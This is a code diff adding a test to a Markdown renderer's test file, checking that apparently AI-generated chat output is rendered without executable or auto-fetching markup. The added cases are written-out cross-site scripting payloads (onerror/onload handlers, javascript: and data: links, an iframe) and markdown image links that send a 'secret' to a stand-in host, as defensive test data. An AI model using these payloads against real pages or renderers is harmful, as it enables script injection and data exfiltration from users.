@@ -20,6 +20,20 @@ it('formats Markdown while rejecting raw HTML, unsafe URLs and remote image load
   expect(html).not.toContain('<img');
 });
 
+it.each([
+  '<img src="https://receiver.invalid/collect?secret=canary" onerror="alert(1)">',
+  '<iframe src="https://receiver.invalid"></iframe>',
+  '<svg onload="alert(1)"></svg>',
+  '[open](javascript:alert%281%29)',
+  '[open](data:text/html;base64,PHNjcmlwdD4=)',
+  '![tracking][pixel]\n\n[pixel]: https://receiver.invalid/collect?secret=canary',
+])('renders hostile output without executable markup or automatic fetch elements: %s', content => {
+  const html = renderToStaticMarkup(createElement(ResponseMarkdown, { content }));
+  expect(html).not.toMatch(/<(?:img|iframe|svg|script)\b/i);
+  expect(html).not.toMatch(/(?:src|onerror|onload)=/i);
+  expect(html).not.toMatch(/href="(?:javascript|data):/i);
+});
+
 it('only final task outputs from current attempts appear as chat responses', () => {
   const first = newId('task'), last = newId('task');
   const old = newId('exec'), current = newId('exec'), research = newId('exec');
